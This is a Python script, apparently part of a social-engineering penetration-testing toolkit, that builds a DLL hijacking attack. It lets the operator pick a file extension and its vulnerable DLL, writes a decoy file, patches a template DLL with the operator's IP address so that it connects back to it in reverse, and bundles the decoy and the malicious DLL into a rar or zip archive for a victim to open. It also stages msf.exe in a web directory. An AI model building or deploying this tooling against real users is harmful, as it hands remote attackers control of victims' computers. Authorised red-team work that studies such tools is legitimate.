#!/usr/bin/env python
##################################
# Code behind the DLL Hijacker
####################################

import os
import re
import subprocess
import time
import sys
import glob
import binascii
from src.core.menu.text import dll_hijacker_text
from src.core.setcore import *

definepath = os.getcwd()

try:
    import zipfile
except ImportError as error:
    log(error)
    print("Module 'zipfile' was not detected, please download and install the python zipfile module")
    exit_set()

print(dll_hijacker_text)

# open the repository, its simple name,extension,dll
fileopen = open("src/webattack/dll_hijacking/repository", "r")

# set base counter for our pick
print("   Enter the choice of the file extension you want to attack:\n")
counter = 1
for line in fileopen:
    line = line.split(",")
    print("    " + str(counter) + ". " + line[0])
    counter = counter + 1

print("\n")
choice = input(setprompt(["2", "15"], ""))

if choice == 'exit':
    exit_set()

if choice == "":
    choice = "1"

choice = int(choice)

# reset the counter and get our payload ready and selected
counter = 1
fileopen = open("src/webattack/dll_hijacking/repository", "r")
for line in fileopen:
    line = line.split(",")
    if int(counter) == int(choice):
        name = line[0].rstrip()
        extension = "." + line[1].rstrip()
        dll = line[2].rstrip()
    counter = counter + 1

print("\n   [*] You have selected the file extension of %s and vulnerable dll of %s" % (extension, dll))

# prep the directories
subprocess.Popen("mkdir " + userconfigpath + "dll", stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE, shell=True).wait()
filename1 = input(setprompt(
    ["2", "15"], "Enter the filename for the attack (example:openthis) [openthis]"))
if filename1 == "":
    filename1 = "openthis"

# move the files there using the correct extension and file type
filewrite = open(userconfigpath + "dll/%s%s" % (filename1, extension), "w")
filewrite.write("EMPTY")
filewrite.close()

if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = input(setprompt(["2", "15"], "IP address to connect back on"))
    update_options("IPADDR=" + ipaddr)

# replace ipaddress with one that we need for reverse connection back
fileopen = open("src/webattack/dll_hijacking/hijacking.dll", "rb")
data = fileopen.read()

filewrite = open(userconfigpath + "dll/%s" % (dll), "wb")

host = int(len(ipaddr) + 1) * "X"

filewrite.write(data.replace(str(host), ipaddr + "\x00", 1))
filewrite.close()


# ask what they want to use
print("""
Do you want to use a zipfile or rar file. Problem with zip
is they will have to extract the files first, you can't just
open the file from inside the zip. Rar does not have this
restriction and is more reliable

1. Rar File
2. Zip File
""")

# flag a choice
choice = input(setprompt(["2", "15"], "[rar]"))
# if default was selected just do rar
if choice == "":
    choice = "1"
# if its not a rar file
if choice != "1":
    # if its not a zipfile, you messed up
    if choice != "2":
        # default to rar file
        choice = "1"

# if its choice 1 do some rar stuff
if choice == "1":

    # basic counter
    counter = 0
    # look for rar in default directories
    rar_check = subprocess.Popen("rar", shell=True, stdout=subprocess.PIPE)
    # comunicate with the process
    stdout_value = rar_check.communicate()[0]
    # do a search to see if rar is present
    match = re.search("Add files to archive", stdout_value)
    # we get a hit?
    if match:
        subprocess.Popen("cd %s/dll;rar a %s/template.rar * 1> /dev/null 2> /dev/null" %
                         (userconfigpath, userconfigpath), shell=True).wait()
        counter = 1

    # if we didnt find rar
    if counter == 0:
        print("[!] Error, rar was not detected. Please download rar and place it in your /usr/bin or /usr/local/bin directory.")
        print("[*] Defaulting to zipfile for the attack vector. Sorry boss.")
        choice = "2"

# if its a zipfile zip the badboy up
if choice == "2":
    # write to a zipfile here
    file = zipfile.ZipFile(userconfigpath + "template.zip", "w")
    for name in glob.glob(userconfigpath + "dll/*"):
        file.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
    file.close()

if os.path.isfile(userconfigpath + "msf.exe"):
    subprocess.Popen("cp %s/msf.exe %s/src/html/" %
                     (userconfigpath, definepath), shell=True).wait()
